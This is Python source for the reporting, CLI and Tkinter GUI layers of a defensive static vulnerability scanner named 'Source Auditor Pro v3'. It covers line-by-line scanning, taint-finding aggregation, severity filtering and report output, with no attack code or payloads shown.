def scan_file(filepath, content):
    findings = {
        "secrets":   [],
        "endpoints": [],
        "configs":   [],
        "logic":     [],
        "sensitive": [],
    }

    # Deduplication: (category, type, file, line)
    seen = set()

    def add(category, vuln_type, value, line_no, raw_line=""):
        key = (category, vuln_type, filepath, line_no)
        if key not in seen:
            seen.add(key)
            findings[category].append(_make_finding(vuln_type, value, filepath, line_no, code_line=raw_line))

    lines = content.splitlines()
    _NOSEC_RE = re.compile(r"//\s*nosec|#\s*nosec", re.IGNORECASE)

    # Logic patterns that make no sense in commented-out code
    _LOGIC_SKIP_IN_COMMENTS = {
        "Missing Rate Limit", "Reflected XSS Sink", "Open Redirect",
        "Information Disclosure (env)", "Plaintext Password Storage",
    }

    for line_no, line in enumerate(lines, 1):
        # Inline suppression: trailing  // nosec  or  # nosec  silences all findings
        if _NOSEC_RE.search(line):
            continue
        is_comment = bool(_COMMENT_RE.match(line))

        # --- SECRETS: scan even in comments (they're still leaked) ---
        for name, regex in SECRET_PATTERNS.items():
            for m in regex.finditer(line):
                add("secrets", name, m.group(), line_no, raw_line=line)

        # --- ENDPOINTS: skip comment lines; remove sub-path duplicates on same line ---
        if not is_comment:
            raw_ep = []
            for regex in ENDPOINT_PATTERNS:
                for m in regex.finditer(line):
                    raw_ep.append((m.start(), m.end(), m.group()))
            # Drop matches fully contained within a longer match on the same line
            for (s1, e1, v1) in raw_ep:
                if not any(s2 <= s1 and e2 >= e1 and (s2, e2) != (s1, e1) for (s2, e2, _) in raw_ep):
                    add("endpoints", "Endpoint", v1, line_no, raw_line=line)

        # --- CONFIG: case-insensitive, skip comments ---
        if not is_comment:
            for name, regex in CONFIG_PATTERNS.items():
                m = regex.search(line)
                if m:
                    add("configs", name, line.strip(), line_no, raw_line=line)

        # --- LOGIC: most patterns scan even in comments; skip structural ones ---
        for name, regex in LOGIC_PATTERNS.items():
            if is_comment and name in _LOGIC_SKIP_IN_COMMENTS:
                continue
            m = regex.search(line)
            if m:
                add("logic", name, line.strip(), line_no, raw_line=line)

        # --- SENSITIVE: skip comments ---
        if not is_comment:
            for name, regex in SENSITIVE_PATTERNS.items():
                for m in regex.finditer(line):
                    add("sensitive", name, m.group(), line_no, raw_line=line)

    return findings


def scan_file_worker(filepath, run_taint=True):
    """
    Entry point for ThreadPoolExecutor.
    Runs regex scanner + (optionally) taint engine + context checker.
    Returns the standard results dict with an extra 'taint' key.
    """
    content = read_file(filepath)
    if not content:
        return {}

    result = scan_file(filepath, content)
    for category, items in result.items():
        for item in items:
            item.setdefault("category", category)

    # ── Taint Engine + Context-Aware Analysis ──────────────────────────────
    result.setdefault("taint", [])
    if run_taint and _TAINT_ENGINE_AVAILABLE:
        _engine  = TaintEngine(verbose=False)
        _context = ContextChecker()
        _srcl = content.splitlines()
        for f in _engine.scan_file(filepath, content) + _context.scan_file(filepath, content):
            _tcl = _srcl[f.sink_line-1].rstrip() if 0 < f.sink_line <= len(_srcl) else ""
            result["taint"].append({
                "type":              f.vuln_type,
                "category":          f.category,
                "file":              f.file,
                "line":              f.sink_line,
                "source_line":       f.source_line,
                "value":             f.sink_expr,
                "source_expr":       f.source_expr,
                "taint_path":        f.taint_path,
                "severity":          f.severity,
                "cwe":               f.cwe,
                "owasp":             f.owasp,
                "exploit":           f.exploit,
                "fix":               f.fix,
                "suppressed":        f.suppressed,
                "suppression_reason": f.suppression_reason,
                "code_line":         _tcl,
            })
    return result


def scan_text(content, source="pasted_code", run_taint=True):
    """Scan in-memory text (paste mode). Runs taint engine too."""
    result = scan_file(source, content)
    result.setdefault("taint", [])
    if run_taint and _TAINT_ENGINE_AVAILABLE:
        _engine  = TaintEngine(verbose=True)
        _context = ContextChecker()
        for f in _engine.scan_file(source, content) + _context.scan_file(source, content):
            result["taint"].append({
                "type":              f.vuln_type,
                "category":          f.category,
                "file":              f.file,
                "line":              f.sink_line,
                "source_line":       f.source_line,
                "value":             f.sink_expr,
                "source_expr":       f.source_expr,
                "taint_path":        f.taint_path,
                "severity":          f.severity,
                "cwe":               f.cwe,
                "owasp":             f.owasp,
                "exploit":           f.exploit,
                "fix":               f.fix,
                "suppressed":        f.suppressed,
                "suppression_reason": f.suppression_reason,
            })
    return result


def merge_results(base, addition):
    for key in base:
        base[key].extend(addition.get(key, []))


# ==============================================================================
# COLOUR HELPERS
# ==============================================================================

_COLORS = {
    "CRITICAL": "\033[91m",
    "HIGH":     "\033[33m",
    "MEDIUM":   "\033[36m",
    "LOW":      "\033[37m",
    "INFO":     "\033[32m",
    "RESET":    "\033[0m",
    "BOLD":     "\033[1m",
}


def colorize(text, *codes, enabled=True):
    if not enabled:
        return text
    prefix = "".join(_COLORS.get(k, "") for k in codes)
    return f"{prefix}{text}{_COLORS['RESET']}"


# ==============================================================================
# REPORTING
# ==============================================================================

def get_vuln_info(vuln_type):
    return VULN_INFO.get(vuln_type, {
        "severity": "INFO",
        "exploit":  "No specific exploit information available for this pattern.",
        "fix":      "Review the flagged code and apply relevant security best practices.",
    })


def severity_passes(severity, min_severity):
    """Return True if severity is at or above the requested minimum."""
    return _SEVERITY_ORDER.get(severity, 99) <= _SEVERITY_ORDER.get(min_severity, 99)


def print_finding(item, use_color=True, min_severity="LOW"):
    """Print one finding dict. Handles both regex findings and taint findings."""
    cat      = item.get("category", "")
    is_taint = cat in ("taint", "context")

    # For taint/context findings, severity is already on the item.
    # For regex findings, look up in VULN_INFO.
    if is_taint:
        severity = item.get("severity", "INFO")
        exploit  = item.get("exploit", "")
        fix      = item.get("fix", "")
    else:
        info     = get_vuln_info(item.get("type", ""))
        severity = info["severity"]
        exploit  = info["exploit"]
        fix      = info["fix"]

    if not severity_passes(severity, min_severity):
        return
    if item.get("suppressed"):
        return  # suppressed by sanitizer — skip unless --show-suppressed

    label = f"[{severity}] [{cat.upper()}] {item['type']}"
    print(colorize(label, severity, "BOLD", enabled=use_color))
    print(f"  File          : {item.get('file','?')} (line {item.get('line','?')})")

    # Taint-specific fields
    if is_taint and item.get("source_line") and item.get("source_line") != item.get("line"):
        print(f"  Taint Source  : line {item['source_line']}  →  {item.get('source_expr','')}")
    if is_taint and item.get("taint_path"):
        print(f"  Taint Path    : {' → '.join(item['taint_path'])}")
    if is_taint and item.get("cwe"):
        print(f"  CWE / OWASP   : {item['cwe']}  /  {item.get('owasp','')}")

    value = item.get("value", "")
    if value:
        print(f"  Matched       : {value[:120]}")

    # Show the exact source code line, with the matched part bolded
    _cl = (item.get("code_line") or "").strip()
    if _cl:
        _lno  = str(item.get("line", "?")).rjust(5)
        _bar  = colorize("│", severity, "BOLD", enabled=use_color)
        _lno_colored = colorize(_lno, severity, enabled=use_color)
        _match = (item.get("value") or "").strip()
        _disp  = _cl[:200]
        if use_color and _match and _match in _disp:
            _i   = _disp.index(_match)
            _pre = _disp[:_i]
            _hit = colorize(_disp[_i:_i + len(_match)], severity, "BOLD", enabled=True)
            _suf = _disp[_i + len(_match):]
            _disp = _pre + _hit + _suf
        print(f"  Code          : {_lno_colored} {_bar}  {_disp}")

    print("  How to exploit:")
    for ln in exploit.splitlines():
        print(f"      {ln}")
    print("  How to fix:")
    for ln in fix.splitlines():
        print(f"      {ln}")
    print("  " + "-" * 66)


def print_finding_suppressed(item, use_color=True):
    """Print suppressed taint findings (shown only with --show-suppressed)."""
    if not item.get("suppressed"):
        return
    label = colorize(
        f"[SUPPRESSED] [{item.get('category','').upper()}] {item['type']}",
        "LOW", enabled=use_color,
    )
    print(label)
    print(f"  File          : {item.get('file','?')} (line {item.get('line','?')})")
    print(f"  Reason        : {item.get('suppression_reason','sanitizer detected')}")
    print("  " + "-" * 66)


def enrich(results):
    """
    Enrich regex findings with VULN_INFO metadata.
    Taint findings already carry their own severity/exploit/fix — pass through as-is.
    """
    enriched = {}
    for category, items in results.items():
        enriched[category] = []
        for item in items:
            if category in ("taint", "context"):
                # Already fully populated by TaintEngine
                enriched[category].append({**item, "category": category})
            else:
                info = get_vuln_info(item.get("type", ""))
                enriched[category].append({**item, "category": category, **info})
    return enriched


def generate_report(results, output_dir="reports", use_color=True,
                    min_severity="LOW", json_only=False, show_suppressed=False):
    rich  = enrich(results)
    total = sum(len(v) for v in rich.values())

    # Count by severity — exclude suppressed taint findings from active counts
    severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    suppressed_count = 0
    for items in rich.values():
        for item in items:
            if item.get("suppressed"):
                suppressed_count += 1
            else:
                sev = item.get("severity", "INFO")
                severity_counts[sev] = severity_counts.get(sev, 0) + 1

    taint_items = rich.get("taint", [])
    active_taint   = [i for i in taint_items if not i.get("suppressed")]
    suppressed_list = [i for i in taint_items if i.get("suppressed")]

    if not json_only:
        divider = "=" * 68
        print(colorize(divider, "BOLD", enabled=use_color))
        print(colorize("  SOURCE AUDITOR PRO v3 -- SCAN REPORT", "BOLD", enabled=use_color))
        print(colorize(divider, "BOLD", enabled=use_color))
        print(f"  Secrets   : {len(rich.get('secrets',   []))}")
        print(f"  Endpoints : {len(rich.get('endpoints', []))}")
        print(f"  Configs   : {len(rich.get('configs',   []))}")
        print(f"  Logic     : {len(rich.get('logic',     []))}")
        print(f"  Sensitive : {len(rich.get('sensitive', []))}")
        taint_total = len(active_taint)
        if taint_total or suppressed_count:
            label = f"  Taint/Ctx : {taint_total} active"
            if suppressed_count:
                label += f"  ({suppressed_count} suppressed by sanitizers)"
            print(label)
        print(f"  TOTAL     : {sum(severity_counts.values())}")
        print()
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
            count = severity_counts.get(sev, 0)
            if count:
                print(colorize(f"  {sev:<8}: {count}", sev, enabled=use_color))
        print(colorize(divider, "BOLD", enabled=use_color))
        print()

        for category, items in rich.items():
            for item in items:
                print_finding(item, use_color=use_color, min_severity=min_severity)

        if show_suppressed:
            for item in suppressed_list:
                print_finding_suppressed(item, use_color=use_color)
        elif suppressed_count:
            print(colorize(
                f"  [{suppressed_count} taint finding(s) suppressed by sanitizers — "
                "use --show-suppressed to view]", "LOW", enabled=use_color,
            ))

    os.makedirs(output_dir, exist_ok=True)

    json_path = os.path.join(output_dir, "report.json")
    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump(rich, fh, indent=4, ensure_ascii=False)

    if not json_only:
        txt_path = os.path.join(output_dir, "report.txt")
        with open(txt_path, "w", encoding="utf-8") as fh:
            fh.write("SOURCE AUDITOR PRO v3 -- FULL REPORT\n")
            fh.write("=" * 68 + "\n\n")
            for category, items in rich.items():
                filtered = [
                    i for i in items
                    if severity_passes(i.get("severity", "LOW"), min_severity)
                    and not i.get("suppressed")
                ]
                if not filtered:
                    continue
                fh.write(f"\n{'=' * 50}\n{category.upper()} ({len(filtered)} findings)\n{'=' * 50}\n")
                for item in filtered:
                    fh.write(f"\n[{item.get('severity','?')}] {item.get('type','?')}\n")
                    fh.write(f"  File          : {item.get('file','?')} (line {item.get('line','?')})\n")
                    if item.get("source_line") and item.get("source_line") != item.get("line"):
                        fh.write(f"  Taint Source  : line {item['source_line']}  →  {item.get('source_expr','')}\n")
                    if item.get("taint_path"):
                        fh.write(f"  Taint Path    : {' → '.join(item['taint_path'])}\n")
                    if item.get("cwe"):
                        fh.write(f"  CWE / OWASP   : {item['cwe']}  /  {item.get('owasp','')}\n")
                    if item.get("value"):
                        fh.write(f"  Matched       : {item['value'][:120]}\n")
                    if item.get("code_line"):
                        _cl_txt = item["code_line"].strip()
                        _lno_txt = str(item.get("line", "?")).rjust(5)
                        _match_txt = (item.get("value") or "").strip()
                        if _match_txt and _match_txt in _cl_txt[:200]:
                            _i = _cl_txt.index(_match_txt)
                            _cl_txt = (
                                _cl_txt[:_i]
                                + ">>>" + _cl_txt[_i:_i+len(_match_txt)] + "<<<"
                                + _cl_txt[_i+len(_match_txt):]
                            )
                        fh.write(f"  Code          : {_lno_txt} │  {_cl_txt[:220]}\n")
                    fh.write("  How to exploit:\n")
                    for ln in item.get("exploit", "").splitlines():
                        fh.write(f"      {ln}\n")
                    fh.write("  How to fix:\n")
                    for ln in item.get("fix", "").splitlines():
                        fh.write(f"      {ln}\n")
                    fh.write("  " + "-" * 66 + "\n")
        print(f"\n[+] Reports saved:")
        print(f"    JSON -> {json_path}")
        print(f"    TXT  -> {txt_path}")
    else:
        print(json_path)

    # CI exit code
    has_high = severity_counts.get("CRITICAL", 0) + severity_counts.get("HIGH", 0) > 0
    return has_high


# ==============================================================================
# CLI MODE
# ==============================================================================

def run_cli(target, output_dir="reports", workers=DEFAULT_WORKERS,
            min_severity="LOW", json_only=False, run_taint=True, show_suppressed=False):
    print(f"[+] Target  : {target}")
    files = get_files(target)
    print(f"[+] Files   : {len(files)} scannable files found")
    print(f"[+] Workers : {workers}")
    if run_taint and _TAINT_ENGINE_AVAILABLE:
        print(f"[+] Taint   : enabled\n")
    else:
        print(f"[+] Taint   : disabled\n")

    final = {"secrets": [], "endpoints": [], "configs": [], "logic": [], "sensitive": [], "taint": []}

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(scan_file_worker, fp, run_taint): fp for fp in files}
        done = 0
        for future in as_completed(futures):
            done += 1
            fp = futures[future]
            try:
                result = future.result()
                merge_results(final, result)
            except Exception as exc:
                print(f"  [ERR] {fp}: {exc}", file=sys.stderr)
            if done % 50 == 0 or done == len(files):
                print(f"  Progress: {done}/{len(files)}", end="\r", flush=True)
    print()

    has_high = generate_report(
        final,
        output_dir=output_dir,
        min_severity=min_severity,
        json_only=json_only,
        show_suppressed=show_suppressed,
    )
    sys.exit(1 if has_high else 0)


def run_paste_cli(output_dir="reports", min_severity="LOW", run_taint=True, show_suppressed=False):
    print("Paste your code below.")
    print("Press Ctrl+D (Linux/Mac) or Ctrl+Z then Enter (Windows) to start the scan.\n")
    try:
        content = sys.stdin.read()
    except KeyboardInterrupt:
        print("\n[!] Aborted.")
        return

    final = {"secrets": [], "endpoints": [], "configs": [], "logic": [], "sensitive": [], "taint": []}
    result = scan_text(content, run_taint=run_taint)
    merge_results(final, result)
    generate_report(final, output_dir=output_dir, min_severity=min_severity, show_suppressed=show_suppressed)


# ==============================================================================
# GUI MODE
# ==============================================================================

def run_gui():
    try:
        import tkinter as tk
        from tkinter import filedialog, scrolledtext, ttk
        import queue as _queue
    except ImportError:
        print("[!] tkinter is not available. Run without --gui to use the CLI.")
        return

    root = tk.Tk()
    root.title("Source Auditor Pro v3.2")
    root.geometry("1020x900")
    root.config(bg="#1e1e1e")

    # ── GUI update queue: worker threads post here, main thread drains it ──────
    # This is the ONLY safe way to update Tkinter from background threads.
    _gui_q = _queue.Queue()

    def _drain_queue():
        """Called by root.after() — runs in main thread, safe to touch widgets."""
        try:
            while True:
                fn, args = _gui_q.get_nowait()
                fn(*args)
        except _queue.Empty:
            pass
        root.after(50, _drain_queue)   # poll every 50 ms

    root.after(50, _drain_queue)

    # ── Header ────────────────────────────────────────────────────────────────
    tk.Label(
        root, text="Source Auditor Pro v3.2",
        fg="#00ff88", bg="#1e1e1e", font=("Consolas", 18, "bold"),
    ).pack(pady=10)

    frame_top = tk.Frame(root, bg="#1e1e1e")
    frame_top.pack(fill="x", padx=12)

    path_entry = tk.Entry(
        frame_top, width=68, bg="#2b2b2b", fg="white",
        insertbackground="white", font=("Consolas", 11),
    )
    path_entry.pack(side="left", padx=4, pady=4)

    # ── Browse buttons ────────────────────────────────────────────────────────
    def browse_folder():
        path = filedialog.askdirectory(title="Select Project Folder")
        if path:
            path_entry.delete(0, tk.END)
            path_entry.insert(0, path)

    def browse_file():
        path = filedialog.askopenfilename(
            title="Select a File to Scan",
            filetypes=[
                ("JS / TS files",  "*.js *.ts *.jsx *.tsx *.mjs *.cjs"),
                ("JSON files",     "*.json"),
                ("HTML files",     "*.html *.htm"),
                ("Config/Env",     "*.env *.yaml *.yml *.config"),
                ("All files",      "*.*"),
            ],
        )
        if path:
            path_entry.delete(0, tk.END)
            path_entry.insert(0, path)

    tk.Button(frame_top, text="📁 Folder", command=browse_folder,
              bg="#444", fg="white", font=("Consolas", 10)).pack(side="left", padx=2)
    tk.Button(frame_top, text="📄 File",   command=browse_file,
              bg="#334", fg="white", font=("Consolas", 10)).pack(side="left", padx=2)
    tk.Button(frame_top, text="▶ Scan",
              command=lambda: threading.Thread(target=_scan_target, daemon=True).start(),
              bg="#005500", fg="white", font=("Consolas", 11, "bold")).pack(side="left", padx=4)
    tk.Button(frame_top, text="Clear",
              command=lambda: output_box.delete("1.0", tk.END),
              bg="#555", fg="white", font=("Consolas", 10)).pack(side="left", padx=2)

    # Severity filter
    sev_var = tk.StringVar(value="LOW")
    tk.Label(frame_top, text="  Min severity:", fg="#aaa",
             bg="#1e1e1e", font=("Consolas", 10)).pack(side="left")
    sev_menu = tk.OptionMenu(frame_top, sev_var, "CRITICAL", "HIGH", "MEDIUM", "LOW")
    sev_menu.config(bg="#333", fg="white", font=("Consolas", 10))
    sev_menu.pack(side="left", padx=2)

    # Taint toggle
    taint_var = tk.BooleanVar(value=True)
    tk.Checkbutton(frame_top, text="Taint Engine", variable=taint_var,
                   bg="#1e1e1e", fg="#aaa", selectcolor="#333",
                   font=("Consolas", 9)).pack(side="left", padx=6)

    # Progress
    progress_bar = ttk.Progressbar(root, length=990)
    progress_bar.pack(pady=4, padx=10, fill="x")

    status_label = tk.Label(root, text="Ready.", fg="#aaaaaa",
                            bg="#1e1e1e", font=("Consolas", 9), anchor="w")
    status_label.pack(fill="x", padx=14)

    # ── Paste box ────────────────────────────────────────────────────────────
    tk.Label(root, text="Paste Code:", fg="#aaaaaa", bg="#1e1e1e",
             font=("Consolas", 10)).pack(anchor="w", padx=14)
    paste_box = scrolledtext.ScrolledText(
        root, height=7, width=122,
        bg="#2b2b2b", fg="#dddddd", font=("Consolas", 10),
    )
    paste_box.pack(padx=10, pady=2, fill="x")

    tk.Button(
        root, text="Scan Pasted Code",
        command=lambda: threading.Thread(target=_scan_paste, daemon=True).start(),
        bg="#002255", fg="white", font=("Consolas", 10, "bold"),
    ).pack(pady=4)

    # ── Findings output box ──────────────────────────────────────────────────
    tk.Label(root, text="Findings:", fg="#aaaaaa", bg="#1e1e1e",
             font=("Consolas", 10)).pack(anchor="w", padx=14)
    output_box = scrolledtext.ScrolledText(
        root, height=18, width=122,
        bg="#0d0d0d", fg="white", font=("Consolas", 10),
    )
    output_box.pack(padx=10, pady=4, fill="both", expand=True)

    output_box.tag_config("CRITICAL", foreground="#ff4444")
    output_box.tag_config("HIGH",     foreground="#ffaa00")
    output_box.tag_config("MEDIUM",   foreground="#00ccff")
    output_box.tag_config("LOW",      foreground="#aaaaaa")
    output_box.tag_config("info",     foreground="#00ff88")
    output_box.tag_config("warn",     foreground="#ff6600")
    output_box.tag_config("code",     foreground="#888888")
    # highlight = the matched vulnerable portion inside the code line
    output_box.tag_config("CRITICAL_hl", foreground="#ff4444", background="#3a0000", font=("Consolas", 10, "bold"))
    output_box.tag_config("HIGH_hl",     foreground="#ffaa00", background="#2a1a00", font=("Consolas", 10, "bold"))
    output_box.tag_config("MEDIUM_hl",   foreground="#00ccff", background="#002030", font=("Consolas", 10, "bold"))
    output_box.tag_config("LOW_hl",      foreground="#dddddd", background="#1a1a1a", font=("Consolas", 10, "bold"))

    # ── Thread-safe GUI helpers ───────────────────────────────────────────────

    def _safe_log(msg, tag="info"):
        """Always safe to call from any thread — queues the GUI update."""
        _gui_q.put((lambda m, t: (
            output_box.insert(tk.END, m + "\n", t),
            output_box.see(tk.END),
        ), (msg, tag)))

    def _safe_log_code(line_no_str, before, matched, after, sev):
        """Insert a code line with the matched portion highlighted.
        Runs in main thread via queue — safe for Tkinter.
        """
        hl_tag = sev + "_hl"
        def _do(ln, b, m, a, ht):
            prefix = f"  Code          : {ln} │  "
            output_box.insert(tk.END, prefix, "code")
            if b:
                output_box.insert(tk.END, b, "code")
            if m:
                output_box.insert(tk.END, m, ht)
            if a:
                output_box.insert(tk.END, a, "code")
            output_box.insert(tk.END, "\n", "code")
            output_box.see(tk.END)
        _gui_q.put((_do, (line_no_str, before, matched, after, hl_tag)))

    def _safe_status(msg):
        _gui_q.put((status_label.config, ({"text": msg},)))

    def _safe_progress(val, maximum=None):
        def _do(v, m):
            if m is not None:
                progress_bar["maximum"] = m
            progress_bar["value"] = v
        _gui_q.put((_do, (val, maximum)))

    # ── Finding display ───────────────────────────────────────────────────────

    def display_items(items, min_sev="LOW"):
        """Can be called from any thread — all output goes through _safe_log."""
        for item in items:
            if not isinstance(item, dict):
                continue

            cat = item.get("category", "unknown")

            # Taint/context findings carry their own severity
            if cat in ("taint", "context"):
                severity     = item.get("severity", "INFO")
                exploit_line = (item.get("exploit") or "").splitlines()[0]
                fix_line     = (item.get("fix")     or "").splitlines()[0]
            else:
                info         = get_vuln_info(item.get("type", ""))
                severity     = info["severity"]
                exploit_line = info["exploit"].splitlines()[0]
                fix_line     = info["fix"].splitlines()[0]

            if not severity_passes(severity, min_sev):
                continue
            if item.get("suppressed"):
                continue

            vuln_type = item.get("type", "Unknown")
            location  = f"{item.get('file', '?')} (line {item.get('line', '?')})"
            value     = (item.get("value") or "").strip()
            code_line = (item.get("code_line") or "").strip()

            _safe_log(f"[{severity}] [{cat.upper()}] {vuln_type}", severity)
            _safe_log(f"  Location      : {location}", severity)

            # Taint-specific extras
            sl = item.get("source_line")
            if sl and sl != item.get("line"):
                _safe_log(f"  Taint Source  : line {sl}  →  {item.get('source_expr','')}", severity)
            tp = item.get("taint_path")
            if tp:
                _safe_log(f"  Taint Path    : {' → '.join(tp)}", severity)
            if item.get("cwe"):
                _safe_log(f"  CWE / OWASP   : {item['cwe']}  /  {item.get('owasp','')}", severity)

            if value:
                _safe_log(f"  Matched       : {value[:120]}", severity)

            # ── THE CODE LINE with matched portion highlighted ────────────────
            if code_line:
                lno = str(item.get("line", "?")).rjust(5)
                # Find where the matched value sits inside the code line
                # so we can highlight exactly that span.
                raw_match = (item.get("value") or "").strip()
                cl_disp   = code_line[:200]
                if raw_match and raw_match in cl_disp:
                    idx    = cl_disp.index(raw_match)
                    before = cl_disp[:idx]
                    matched = cl_disp[idx:idx + len(raw_match)]
                    after  = cl_disp[idx + len(raw_match):]
                else:
                    # matched value not found verbatim (truncated or multiline)
                    # — show the whole line highlighted
                    before, matched, after = "", cl_disp, ""
                _safe_log_code(lno, before, matched, after, severity)

            if exploit_line:
                _safe_log(f"  How to exploit: {exploit_line}", severity)
            if fix_line:
                _safe_log(f"  How to fix    : {fix_line}", severity)
            _safe_log("  " + "─" * 68, "info")

    # ── Scan target (file or folder) ─────────────────────────────────────────

    def _scan_target():
        target = path_entry.get().strip()
        if not target:
            _safe_log("[!] Select a folder or file first.", "warn")
            return
        if not os.path.exists(target):
            _safe_log(f"[!] Path does not exist: {target}", "warn")
            return

        min_sev   = sev_var.get()
        run_taint = taint_var.get()

        # ── Resolve file list ─────────────────────────────────────────────────
        if os.path.isfile(target):
            files = [target]
            ext   = os.path.splitext(target)[1].lower()
            _safe_log(f"[+] Scanning file: {os.path.basename(target)}  [{ext}]", "info")
        else:
            files = get_files(target)
            if not files:
                # Count all files to give useful feedback
                all_f = sum(len(fs) for _, _, fs in os.walk(target))
                _safe_log(f"[!] No scannable files found in: {target}", "warn")
                _safe_log(f"    Folder contains {all_f} total files — check supported extensions.", "warn")
                _safe_log(f"    Supported: {', '.join(SCAN_EXTENSIONS[:8])} ...", "warn")
                return
            _safe_log(f"[+] Folder scan: {len(files)} files found", "info")

        _safe_progress(0, maximum=len(files))
        final = {"secrets": [], "endpoints": [], "configs": [],
                 "logic": [], "sensitive": [], "taint": []}
        lock = threading.Lock()

        def _worker(fp):
            try:
                result = scan_file_worker(fp, run_taint=run_taint)
            except Exception as exc:
                _safe_log(f"  [ERR] {os.path.basename(fp)}: {exc}", "warn")
                return

            with lock:
                merge_results(final, result)

            # Tag category on each item
            for cat, items in result.items():
                for item in items:
                    item.setdefault("category", cat)

            # Count findings for this file
            n = sum(len(v) for v in result.values())
            _safe_status(f"Scanned: {os.path.basename(fp)} — {n} finding(s)")
            _safe_progress(None)   # increment handled below

            # Display — safe because _safe_log queues everything
            for cat, items in result.items():
                display_items(items, min_sev)

        # Run workers and increment progress after each
        done = [0]
        threads = []
        for fp in files:
            def _run(f=fp):
                _worker(f)
                with lock:
                    done[0] += 1
                _safe_progress(done[0])
            t = threading.Thread(target=_run, daemon=True)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        _safe_log("\n[+] Scan complete! Saving report...", "info")
        try:
            generate_report(final, use_color=False, min_severity=min_sev)
            _safe_log("[+] Report saved to reports/ folder.", "info")
        except Exception as exc:
            _safe_log(f"[!] Report save failed: {exc}", "warn")
        _safe_status("Done.")

    # ── Paste scan ───────────────────────────────────────────────────────────

    def _scan_paste():
        content = paste_box.get("1.0", tk.END).strip()
        if not content:
            _safe_log("[!] Paste box is empty — add some code first.", "warn")
            return
        min_sev   = sev_var.get()
        run_taint = taint_var.get()

        _safe_log("[+] Scanning pasted code...", "info")
        try:
            result = scan_text(content, run_taint=run_taint)
        except Exception as exc:
            _safe_log(f"[!] Scan error: {exc}", "warn")
            return

        final = {"secrets": [], "endpoints": [], "configs": [],
                 "logic": [], "sensitive": [], "taint": []}
        merge_results(final, result)

        for cat, items in result.items():
            for item in items:
                item.setdefault("category", cat)
            display_items(items, min_sev)

        _safe_log("\n[+] Scan complete! Saving report...", "info")
        try:
            generate_report(final, use_color=False, min_severity=min_sev)
            _safe_log("[+] Report saved to reports/ folder.", "info")
        except Exception as exc:
            _safe_log(f"[!] Report save failed: {exc}", "warn")

    root.mainloop()


# ==============================================================================
# ENTRY POINT
# ==============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=(
            "Source Auditor Pro v3 -- Static vulnerability scanner.\n"
            "Detects secrets, insecure config, logic flaws, sensitive data,\n"
            "and taint flows from user input to dangerous sinks (AST mode).\n\n"
            "Exit code: 1 if CRITICAL or HIGH findings exist (CI-friendly)."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("target",            nargs="?",  help="Path to the folder to scan.")
    parser.add_argument("--gui",             action="store_true", help="Open the graphical interface.")
    parser.add_argument("--paste",           action="store_true", help="Read code from stdin and scan it.")
    parser.add_argument("--workers",         type=int, default=DEFAULT_WORKERS,
                        help=f"Number of parallel scan threads (default: {DEFAULT_WORKERS}).")
    parser.add_argument("--output-dir",      default="reports",
                        help="Directory for report files (default: reports/).")
    parser.add_argument("--severity",        default="LOW",
                        choices=["CRITICAL", "HIGH", "MEDIUM", "LOW"],
                        help="Minimum severity level to display (default: LOW).")
    parser.add_argument("--json-only",       action="store_true",
                        help="Write JSON report only; suppress all terminal output except the path.")
    parser.add_argument("--no-taint",        action="store_true",
                        help="Disable taint engine (faster, regex-only mode).")
    parser.add_argument("--show-suppressed", action="store_true",
                        help="Show taint findings suppressed by sanitizers.")

    args = parser.parse_args()

    if args.gui:
        run_gui()
    elif args.paste:
        run_paste_cli(
            output_dir=args.output_dir,
            min_severity=args.severity,
            run_taint=not args.no_taint,
            show_suppressed=args.show_suppressed,
        )
    elif args.target:
        run_cli(
            args.target,
            output_dir=args.output_dir,
            workers=args.workers,
            min_severity=args.severity,
            json_only=args.json_only,
            run_taint=not args.no_taint,
            show_suppressed=args.show_suppressed,
        )
    else:
        parser.print_help()